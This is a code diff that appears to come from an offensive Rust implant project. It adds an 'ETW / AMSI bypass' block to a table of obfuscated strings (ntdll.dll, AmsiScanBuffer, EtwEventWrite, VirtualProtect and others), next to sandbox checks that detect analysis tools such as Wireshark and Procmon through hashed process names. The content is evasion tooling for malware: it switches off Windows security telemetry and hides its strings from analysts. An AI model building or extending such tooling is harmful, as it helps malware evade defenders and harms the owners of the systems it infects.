@@ -242,6 +242,15 @@ STRINGS = [
     ("det_temp_sample", "\\sample"),
     ("det_temp_env", "TEMP"),
 
+    # === bypass.rs - ETW / AMSI ===
+    ("bypass_ntdll", "ntdll.dll"),
+    ("bypass_amsi", "amsi.dll"),
+    ("bypass_etw_func", "EtwEventWrite"),
+    ("bypass_amsi_func", "AmsiScanBuffer"),
+    ("bypass_virtualprotect", "VirtualProtect"),
+    ("bypass_flushicache", "FlushInstructionCache"),
+    ("bypass_getprocess", "GetCurrentProcess"),
+
     # === sandbox.rs - process name hashes (analysis tools, encoded as hex strings) ===
     # These are FNV1a-32 hashes represented as u32 literals, no plaintext stored
     # wireshark.exe=0xB9DEF0A9, procmon.exe=0x6D71F28C, procmon64.exe=0x7C3BD9A8
